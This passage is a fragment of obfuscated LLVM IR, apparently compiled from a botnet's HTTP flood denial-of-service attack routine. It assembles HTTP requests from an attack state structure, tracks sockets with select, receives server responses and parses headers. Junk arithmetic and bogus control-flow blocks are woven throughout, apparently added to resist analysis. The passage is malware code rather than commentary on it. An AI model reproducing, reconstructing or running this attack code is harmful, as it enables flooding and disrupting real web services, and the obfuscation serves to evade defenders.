  %4403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4403, i32 0, i32 0
  %4405 = load i32, i32* %4404, align 4
  %_114 = sub i32 0, %4405
  %gen115 = add i32 %_114, 64
  %_116 = sub i32 %4405, 64
  %gen117 = mul i32 %_116, 64
  %_118 = shl i32 %4405, 64
  %_119 = shl i32 %4405, 64
  %_120 = shl i32 %4405, 64
  %_121 = sub i32 0, %4405
  %gen122 = add i32 %_121, 64
  %_123 = sub i32 0, %4405
  %gen124 = add i32 %_123, 64
  %_125 = sub i32 %4405, 64
  %gen126 = mul i32 %_125, 64
  %4406 = srem i32 %4405, 64
  %4407 = zext i32 %4406 to i64
  %_127 = sub i64 0, 1
  %gen128 = add i64 %_127, %4407
  %_129 = sub i64 0, 1
  %gen130 = add i64 %_129, %4407
  %_131 = sub i64 0, 1
  %gen132 = add i64 %_131, %4407
  %_133 = shl i64 1, %4407
  %_134 = shl i64 1, %4407
  %_135 = shl i64 1, %4407
  %4408 = shl i64 1, %4407
  %4409 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4410 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4411 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4410, i32 0, i32 0
  %4412 = load i32, i32* %4411, align 4
  %_136 = sub i32 0, %4412
  %gen137 = add i32 %_136, 64
  %_138 = shl i32 %4412, 64
  %_139 = sub i32 0, %4412
  %gen140 = add i32 %_139, 64
  %_141 = shl i32 %4412, 64
  %_142 = sub i32 %4412, 64
  %gen143 = mul i32 %_142, 64
  %_144 = sub i32 0, %4412
  %gen145 = add i32 %_144, 64
  %_146 = sub i32 0, %4412
  %gen147 = add i32 %_146, 64
  %_148 = sub i32 %4412, 64
  %gen149 = mul i32 %_148, 64
  %4413 = sdiv i32 %4412, 64
  %4414 = sext i32 %4413 to i64
  %4415 = getelementptr inbounds [16 x i64], [16 x i64]* %4409, i64 0, i64 %4414
  %4416 = load i64, i64* %4415, align 8
  %_150 = sub i64 0, %4416
  %gen151 = add i64 %_150, %4408
  %4417 = or i64 %4416, %4408
  store i64 %4417, i64* %4415, align 8
  %4418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4418, i32 0, i32 0
  %4420 = load i32, i32* %4419, align 4
  %4421 = load i32, i32* %23, align 4
  %4422 = icmp sgt i32 %4420, %4421
  br label %originalBB113

originalBB155alteredBB:                           ; preds = %originalBB155, %918
  %4423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4423, i32 0, i32 1
  %4425 = load i8, i8* %4424, align 4
  %4426 = zext i8 %4425 to i32
  %4427 = icmp eq i32 %4426, 4
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %940
  %4428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4428, i32 0, i32 14
  store i32 -1, i32* %4429, align 4
  %4430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4430, i32 0, i32 11
  store i32 0, i32* %4431, align 4
  %4432 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4432, i32 0, i32 18
  %4434 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4433, i32 0, i32 0
  call void @util_zero(i8* %4434, i32 1024)
  %4435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4435, i32 0, i32 17
  store i32 0, i32* %4436, align 4
  %4437 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %4437, i32 10240)
  %4438 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4439 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4440 = call i32 @util_strlen(i8* %4439)
  %4441 = sext i32 %4440 to i64
  %4442 = getelementptr inbounds i8, i8* %4438, i64 %4441
  %4443 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4443, i32 0, i32 9
  %4445 = getelementptr inbounds [9 x i8], [9 x i8]* %4444, i32 0, i32 0
  %4446 = call i32 @util_strcpy(i8* %4442, i8* %4445)
  %4447 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4448 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4449 = call i32 @util_strlen(i8* %4448)
  %4450 = sext i32 %4449 to i64
  %4451 = getelementptr inbounds i8, i8* %4447, i64 %4450
  %4452 = call i32 @util_strcpy(i8* %4451, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %4453 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4454 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4455 = call i32 @util_strlen(i8* %4454)
  %4456 = sext i32 %4455 to i64
  %4457 = getelementptr inbounds i8, i8* %4453, i64 %4456
  %4458 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4458, i32 0, i32 6
  %4460 = getelementptr inbounds [257 x i8], [257 x i8]* %4459, i32 0, i32 0
  %4461 = call i32 @util_strcpy(i8* %4457, i8* %4460)
  %4462 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4463 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4464 = call i32 @util_strlen(i8* %4463)
  %4465 = sext i32 %4464 to i64
  %4466 = getelementptr inbounds i8, i8* %4462, i64 %4465
  %4467 = call i32 @util_strcpy(i8* %4466, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %4468 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4469 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4470 = call i32 @util_strlen(i8* %4469)
  %4471 = sext i32 %4470 to i64
  %4472 = getelementptr inbounds i8, i8* %4468, i64 %4471
  %4473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4473, i32 0, i32 5
  %4475 = getelementptr inbounds [512 x i8], [512 x i8]* %4474, i32 0, i32 0
  %4476 = call i32 @util_strcpy(i8* %4472, i8* %4475)
  %4477 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4478 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4479 = call i32 @util_strlen(i8* %4478)
  %4480 = sext i32 %4479 to i64
  %4481 = getelementptr inbounds i8, i8* %4477, i64 %4480
  %4482 = call i32 @util_strcpy(i8* %4481, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %4483 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4484 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4485 = call i32 @util_strlen(i8* %4484)
  %4486 = sext i32 %4485 to i64
  %4487 = getelementptr inbounds i8, i8* %4483, i64 %4486
  %4488 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4489 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4488, i32 0, i32 7
  %4490 = getelementptr inbounds [129 x i8], [129 x i8]* %4489, i32 0, i32 0
  %4491 = call i32 @util_strcpy(i8* %4487, i8* %4490)
  %4492 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4493 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4494 = call i32 @util_strlen(i8* %4493)
  %4495 = sext i32 %4494 to i64
  %4496 = getelementptr inbounds i8, i8* %4492, i64 %4495
  %4497 = call i32 @util_strcpy(i8* %4496, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %4498 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4499 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4500 = call i32 @util_strlen(i8* %4499)
  %4501 = sext i32 %4500 to i64
  %4502 = getelementptr inbounds i8, i8* %4498, i64 %4501
  %4503 = call i8* @table_retrieve_val(i32 39, i32* null)
  %4504 = call i32 @util_strcpy(i8* %4502, i8* %4503)
  call void @table_lock_val(i8 zeroext 39)
  %4505 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4506 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4507 = call i32 @util_strlen(i8* %4506)
  %4508 = sext i32 %4507 to i64
  %4509 = getelementptr inbounds i8, i8* %4505, i64 %4508
  %4510 = call i32 @util_strcpy(i8* %4509, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %4511 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4512 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4513 = call i32 @util_strlen(i8* %4512)
  %4514 = sext i32 %4513 to i64
  %4515 = getelementptr inbounds i8, i8* %4511, i64 %4514
  %4516 = call i8* @table_retrieve_val(i32 40, i32* null)
  %4517 = call i32 @util_strcpy(i8* %4515, i8* %4516)
  call void @table_lock_val(i8 zeroext 40)
  %4518 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4519 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4520 = call i32 @util_strlen(i8* %4519)
  %4521 = sext i32 %4520 to i64
  %4522 = getelementptr inbounds i8, i8* %4518, i64 %4521
  %4523 = call i32 @util_strcpy(i8* %4522, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %4524 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4525 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4526 = call i32 @util_strlen(i8* %4525)
  %4527 = sext i32 %4526 to i64
  %4528 = getelementptr inbounds i8, i8* %4524, i64 %4527
  %4529 = call i8* @table_retrieve_val(i32 41, i32* null)
  %4530 = call i32 @util_strcpy(i8* %4528, i8* %4529)
  call void @table_lock_val(i8 zeroext 41)
  %4531 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4532 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4533 = call i32 @util_strlen(i8* %4532)
  %4534 = sext i32 %4533 to i64
  %4535 = getelementptr inbounds i8, i8* %4531, i64 %4534
  %4536 = call i32 @util_strcpy(i8* %4535, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4537 = load i8*, i8** %14, align 8
  %4538 = icmp ne i8* %4537, null
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %1109
  %4539 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4539, i32 0, i32 15
  %4541 = load i32, i32* %4540, align 4
  %4542 = icmp sgt i32 %4541, 0
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %1165
  %4543 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4544 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4545 = call i32 @util_strlen(i8* %4544)
  %4546 = sext i32 %4545 to i64
  %4547 = getelementptr inbounds i8, i8* %4543, i64 %4546
  %4548 = call i32 @util_strcpy(i8* %4547, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1294
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1376
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1399
  %4549 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4549, i32 0, i32 1
  store i8 0, i8* %4550, align 4
  %4551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4551, i32 0, i32 0
  %4553 = load i32, i32* %4552, align 4
  %4554 = call i32 @close(i32 %4553)
  %4555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4555, i32 0, i32 0
  store i32 -1, i32* %4556, align 4
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1424
  %4557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4557, i32 0, i32 1
  store i8 0, i8* %4558, align 4
  %4559 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4560 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4559, i32 0, i32 0
  %4561 = load i32, i32* %4560, align 4
  %4562 = call i32 @close(i32 %4561)
  %4563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4563, i32 0, i32 0
  store i32 -1, i32* %4564, align 4
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1456
  %4565 = load i32, i32* %9, align 4
  %_188 = shl i32 %4565, 1
  %_189 = sub i32 0, %4565
  %gen190 = add i32 %_189, 1
  %4566 = add nsw i32 %4565, 1
  store i32 %4566, i32* %9, align 4
  br label %originalBB187

originalBB194alteredBB:                           ; preds = %originalBB194, %1475
  %4567 = load i32, i32* %23, align 4
  %4568 = icmp eq i32 %4567, 0
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1495
  %4569 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %4569, align 8
  %4570 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %4570, align 8
  %4571 = load i32, i32* %23, align 4
  %4572 = call i32 @select(i32 %4571, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %4572, i32* %24, align 4
  %4573 = call i64 @time(i64* null) #6
  %4574 = trunc i64 %4573 to i32
  store i32 %4574, i32* %27, align 4
  %4575 = load i32, i32* %24, align 4
  %4576 = icmp slt i32 %4575, 1
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1536
  %4577 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4578, i32 0, i32 0
  %4580 = load i32, i32* %4579, align 4
  %_203 = sub i32 0, %4580
  %gen204 = add i32 %_203, 64
  %_205 = shl i32 %4580, 64
  %_206 = shl i32 %4580, 64
  %_207 = shl i32 %4580, 64
  %_208 = sub i32 0, %4580
  %gen209 = add i32 %_208, 64
  %4581 = sdiv i32 %4580, 64
  %4582 = sext i32 %4581 to i64
  %4583 = getelementptr inbounds [16 x i64], [16 x i64]* %4577, i64 0, i64 %4582
  %4584 = load i64, i64* %4583, align 8
  %4585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4585, i32 0, i32 0
  %4587 = load i32, i32* %4586, align 4
  %_210 = shl i32 %4587, 64
  %_211 = sub i32 0, %4587
  %gen212 = add i32 %_211, 64
  %_213 = sub i32 0, %4587
  %gen214 = add i32 %_213, 64
  %_215 = sub i32 0, %4587
  %gen216 = add i32 %_215, 64
  %4588 = srem i32 %4587, 64
  %4589 = zext i32 %4588 to i64
  %_217 = sub i64 0, 1
  %gen218 = add i64 %_217, %4589
  %_219 = sub i64 0, 1
  %gen220 = add i64 %_219, %4589
  %_221 = sub i64 1, %4589
  %gen222 = mul i64 %_221, %4589
  %4590 = shl i64 1, %4589
  %_223 = sub i64 0, %4584
  %gen224 = add i64 %_223, %4590
  %_225 = sub i64 %4584, %4590
  %gen226 = mul i64 %_225, %4590
  %_227 = sub i64 %4584, %4590
  %gen228 = mul i64 %_227, %4590
  %_229 = sub i64 %4584, %4590
  %gen230 = mul i64 %_229, %4590
  %_231 = sub i64 0, %4584
  %gen232 = add i64 %_231, %4590
  %_233 = shl i64 %4584, %4590
  %4591 = and i64 %4584, %4590
  %4592 = icmp ne i64 %4591, 0
  br label %originalBB202

originalBB237alteredBB:                           ; preds = %originalBB237, %1569
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %4593 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4593, i32 0, i32 0
  %4595 = load i32, i32* %4594, align 4
  %4596 = bitcast i32* %35 to i8*
  %4597 = call i32 @getsockopt(i32 %4595, i32 1, i32 4, i8* %4596, i32* %36) #6
  store i32 %4597, i32* %12, align 4
  %4598 = load i32, i32* %35, align 4
  %4599 = icmp eq i32 %4598, 0
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %1632
  store i32 0, i32* %37, align 4
  %4600 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %4600, i32 10240)
  %4601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4601, i32 0, i32 0
  %4603 = load i32, i32* %4602, align 4
  %4604 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4605 = call i64 @recv(i32 %4603, i8* %4604, i64 10240, i32 16386)
  %4606 = trunc i64 %4605 to i32
  store i32 %4606, i32* %12, align 4
  %4607 = icmp slt i32 %4606, 1
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %1674
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %1705
  %4608 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4609 = load i32, i32* %12, align 4
  %4610 = call i8* @table_retrieve_val(i32 52, i32* null)
  %4611 = call i32 @util_stristr(i8* %4608, i32 %4609, i8* %4610)
  %4612 = icmp ne i32 %4611, -1
  br label %originalBB249

originalBB253alteredBB:                           ; preds = %originalBB253, %1727
  %4613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4613, i32 0, i32 11
  store i32 1, i32* %4614, align 4
  br label %originalBB253

originalBB257alteredBB:                           ; preds = %originalBB257, %1754
  %4615 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4616 = load i32, i32* %12, align 4
  %4617 = call i8* @table_retrieve_val(i32 51, i32* null)
  %4618 = call i32 @util_stristr(i8* %4615, i32 %4616, i8* %4617)
  store i32 %4618, i32* %38, align 4
  %4619 = load i32, i32* %38, align 4
  %4620 = sext i32 %4619 to i64
  %4621 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4620
  %4622 = load i8, i8* %4621, align 1
  %4623 = sext i8 %4622 to i32
  %4624 = icmp eq i32 %4623, 32
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %1781
  %4625 = load i32, i32* %38, align 4
  %4626 = add nsw i32 %4625, 1
  store i32 %4626, i32* %38, align 4
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %1836
  br label %originalBB265

originalBB269alteredBB:                           ; preds = %originalBB269, %1861
  %4627 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4628 = load i32, i32* %12, align 4
  %4629 = call i8* @table_retrieve_val(i32 48, i32* null)
  %4630 = call i32 @util_stristr(i8* %4627, i32 %4628, i8* %4629)
  store i32 %4630, i32* %41, align 4
  %4631 = load i32, i32* %41, align 4
  %4632 = sext i32 %4631 to i64
  %4633 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4632
  %4634 = load i8, i8* %4633, align 1
  %4635 = sext i8 %4634 to i32
  %4636 = icmp eq i32 %4635, 32
  br label %originalBB269

originalBB273alteredBB:                           ; preds = %originalBB273, %1902
  %4637 = load i32, i32* %41, align 4
  %4638 = sext i32 %4637 to i64
  %4639 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4638
  store i8* %4639, i8** %43, align 8
  %4640 = load i32, i32* %42, align 4
  %4641 = icmp sge i32 %4640, 2
  br label %originalBB273

originalBB277alteredBB:                           ; preds = %originalBB277, %1939
  %4642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4642, i32 0, i32 13
  store i32 1, i32* %4643, align 4
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %1958
  br label %originalBB281

originalBB285alteredBB:                           ; preds = %originalBB285, %2007
  %4644 = load i32, i32* %44, align 4
  %4645 = sext i32 %4644 to i64
  %4646 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4645
  store i8* %4646, i8** %46, align 8
  %4647 = load i32, i32* %45, align 4
  %4648 = icmp sge i32 %4647, 2
  br label %originalBB285

originalBB289alteredBB:                           ; preds = %originalBB289, %2029
  %4649 = load i32, i32* %45, align 4
  %_290 = sub i32 %4649, 2
  %gen291 = mul i32 %_290, 2
  %_292 = sub i32 %4649, 2
  %gen293 = mul i32 %_292, 2
  %_294 = sub i32 0, %4649
  %gen295 = add i32 %_294, 2
  %_296 = shl i32 %4649, 2
  %_297 = sub i32 0, %4649
  %gen298 = add i32 %_297, 2
  %4650 = sub nsw i32 %4649, 2
  store i32 %4650, i32* %45, align 4
  br label %originalBB289

originalBB302alteredBB:                           ; preds = %originalBB302, %2062
  store i32 0, i32* %37, align 4
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2079
  %4651 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4652 = load i32, i32* %37, align 4
  %4653 = sext i32 %4652 to i64
  %4654 = getelementptr inbounds i8, i8* %4651, i64 %4653
  %4655 = load i32, i32* %12, align 4
  %4656 = call i8* @table_retrieve_val(i32 46, i32* null)
  %4657 = call i32 @util_stristr(i8* %4654, i32 %4655, i8* %4656)
  %4658 = icmp ne i32 %4657, -1
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2111
  %4659 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4660 = load i32, i32* %37, align 4
  %4661 = sext i32 %4660 to i64
  %4662 = getelementptr inbounds i8, i8* %4659, i64 %4661
  %4663 = load i32, i32* %12, align 4
  %4664 = call i8* @table_retrieve_val(i32 46, i32* null)
  %4665 = call i32 @util_stristr(i8* %4662, i32 %4663, i8* %4664)
  store i32 %4665, i32* %47, align 4
  %4666 = load i32, i32* %37, align 4
  %4667 = load i32, i32* %47, align 4
  %_311 = sub i32 0, %4666
  %gen312 = add i32 %_311, %4667
  %_313 = shl i32 %4666, %4667
  %_314 = sub i32 0, %4666
  %gen315 = add i32 %_314, %4667
  %_316 = sub i32 0, %4666
  %gen317 = add i32 %_316, %4667
  %_318 = sub i32 %4666, %4667
  %gen319 = mul i32 %_318, %4667
  %4668 = add nsw i32 %4666, %4667
  %4669 = sext i32 %4668 to i64
  %4670 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4669
  %4671 = load i8, i8* %4670, align 1
  %4672 = sext i8 %4671 to i32
  %4673 = icmp eq i32 %4672, 32
  br label %originalBB310

originalBB323alteredBB:                           ; preds = %originalBB323, %2162
  %4674 = load i32, i32* %37, align 4
  %4675 = load i32, i32* %47, align 4
  %_324 = sub i32 %4674, %4675
  %gen325 = mul i32 %_324, %4675
  %_326 = sub i32 %4674, %4675
  %gen327 = mul i32 %_326, %4675
  %4676 = add nsw i32 %4674, %4675
  %4677 = sext i32 %4676 to i64
  %4678 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4677
  store i8* %4678, i8** %49, align 8
  %4679 = load i32, i32* %48, align 4
  %4680 = icmp sge i32 %4679, 2
  br label %originalBB323

originalBB331alteredBB:                           ; preds = %originalBB331, %2227
  %4681 = load i32, i32* %10, align 4
  %4682 = load i8*, i8** %49, align 8
  %4683 = call i32 @util_strlen(i8* %4682)
  %4684 = icmp slt i32 %4681, %4683
  br label %originalBB331

originalBB335alteredBB:                           ; preds = %originalBB335, %2256
  br label %originalBB335

originalBB339alteredBB:                           ; preds = %originalBB339, %2273
  br label %originalBB339

originalBB343alteredBB:                           ; preds = %originalBB343, %2290
  %4685 = load i32, i32* %10, align 4
  %4686 = add nsw i32 %4685, 1
  store i32 %4686, i32* %10, align 4
  br label %originalBB343

originalBB347alteredBB:                           ; preds = %originalBB347, %2317
  %4687 = load i32, i32* %10, align 4
  store i32 %4687, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %originalBB347

originalBB351alteredBB:                           ; preds = %originalBB351, %2360
  %4688 = load i8*, i8** %49, align 8
  %4689 = call i32 @util_strlen(i8* %4688)
  %4690 = icmp slt i32 %4689, 128
  br label %originalBB351

originalBB355alteredBB:                           ; preds = %originalBB355, %2419
  %4691 = load i32, i32* %52, align 4
  %_356 = sub i32 %4691, 1
  %gen357 = mul i32 %_356, 1
  %4692 = add nsw i32 %4691, 1
  store i32 %4692, i32* %52, align 4
  br label %originalBB355

originalBB361alteredBB:                           ; preds = %originalBB361, %2476
  %4693 = load i32, i32* %10, align 4
  %_362 = sub i32 0, %4693
  %gen363 = add i32 %_362, 1
  %_364 = sub i32 0, %4693
  %gen365 = add i32 %_364, 1
  %4694 = add nsw i32 %4693, 1
  store i32 %4694, i32* %10, align 4
  br label %originalBB361

originalBB369alteredBB:                           ; preds = %originalBB369, %2594
  %4695 = load i8*, i8** %54, align 8
  %4696 = load i32, i32* %10, align 4
  %_370 = shl i32 %4696, 1
  %_371 = sub i32 %4696, 1
  %gen372 = mul i32 %_371, 1
  %_373 = sub i32 %4696, 1
  %gen374 = mul i32 %_373, 1
  %_375 = sub i32 %4696, 1
  %gen376 = mul i32 %_375, 1
  %4697 = add nsw i32 %4696, 1
  %4698 = sext i32 %4697 to i64
  %4699 = getelementptr inbounds i8, i8* %4695, i64 %4698
  %4700 = call i32 @util_strlen(i8* %4699)
  %4701 = icmp slt i32 %4700, 256
  br label %originalBB369

originalBB380alteredBB:                           ; preds = %originalBB380, %2630
  br label %originalBB380

originalBB384alteredBB:                           ; preds = %originalBB384, %2650
  br label %originalBB384

originalBB388alteredBB:                           ; preds = %originalBB388, %2667
  %4702 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4703 = load i32, i32* %12, align 4
  %4704 = call i8* @table_retrieve_val(i32 44, i32* null)
  %4705 = call i32 @util_stristr(i8* %4702, i32 %4703, i8* %4704)
  %4706 = icmp ne i32 %4705, -1
  br label %originalBB388

originalBB392alteredBB:                           ; preds = %originalBB392, %2689
  %4707 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4708 = load i32, i32* %12, align 4
  %4709 = call i8* @table_retrieve_val(i32 44, i32* null)
  %4710 = call i32 @util_stristr(i8* %4707, i32 %4708, i8* %4709)
  store i32 %4710, i32* %55, align 4
  %4711 = load i32, i32* %55, align 4
  %4712 = sext i32 %4711 to i64
  %4713 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4712
  %4714 = load i8, i8* %4713, align 1
  %4715 = sext i8 %4714 to i32
  %4716 = icmp eq i32 %4715, 32
  br label %originalBB392

originalBB396alteredBB:                           ; preds = %originalBB396, %2716
  %4717 = load i32, i32* %55, align 4
  %4718 = add nsw i32 %4717, 1
  store i32 %4718, i32* %55, align 4
  br label %originalBB396

originalBB400alteredBB:                           ; preds = %originalBB400, %2752
  %4719 = load i32, i32* %56, align 4
  %_401 = sub i32 0, %4719
  %gen402 = add i32 %_401, 2
  %4720 = sub nsw i32 %4719, 2
  store i32 %4720, i32* %56, align 4
  br label %originalBB400

originalBB406alteredBB:                           ; preds = %originalBB406, %2803
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %2821
  %4721 = load i32, i32* %10, align 4
  %_411 = shl i32 %4721, 1
  %_412 = shl i32 %4721, 1
  %_413 = sub i32 %4721, 1
  %gen414 = mul i32 %_413, 1
  %_415 = sub i32 0, %4721
  %gen416 = add i32 %_415, 1
